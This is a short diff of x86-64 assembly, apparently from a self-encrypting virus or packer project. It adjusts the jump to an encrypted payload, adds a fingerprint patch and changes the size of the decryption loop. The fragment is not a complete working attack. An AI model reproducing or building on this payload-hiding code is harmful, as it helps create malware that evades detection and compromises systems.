@@ -97,7 +97,8 @@ chiffrement_loop1_a:
 	cmp r13, 2 ; chiffrement & dechiffrement
 	je end_ft_end ; chiffrement & dechiffrement
 
-lea r13, [$ + 0xd]
+sub r15d, 0x12345678; To patch, fingerprint
+lea r13, [ft_end]
 add r15, r13
 jmp r15 ; addresse du payload ; jmp_to_payload
 
@@ -105,7 +106,7 @@ ft_end:
 mov r9, 8 ; NB_TIMING MOODULABLE ; dechiffrement
 mov r13, 2 ; mark this zone as end ; dechiffrement
 dechiffrement_loop2:
-	mov eax, 0x27d6;|REPLACE2| taille du 0x1847d ; dechiffrement & chiffrement
+	mov eax, 0x2831;|REPLACE2| taille du 0x1847d ; dechiffrement & chiffrement
 	shr eax, 2 ; dechiffrement & chiffrement
 ;
 	jmp after_exit_3
